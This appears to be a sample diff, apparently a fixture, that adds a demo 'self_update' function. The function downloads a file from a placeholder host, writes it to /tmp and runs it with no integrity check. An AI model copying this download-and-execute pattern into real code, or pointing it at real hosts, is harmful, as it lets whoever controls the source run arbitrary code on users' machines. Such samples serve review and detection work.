@@ -1,0 +1,15 @@
+diff --git a/src/demo/update.py b/src/demo/update.py
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/src/demo/update.py
+@@ -0,0 +1,9 @@
++import subprocess
++import requests
++
++
++def self_update():
++    blob = requests.get("https://example.invalid/bin/update").content
++    with open("/tmp/update", "wb") as fh:
++        fh.write(blob)
++    subprocess.run(["/tmp/update"])
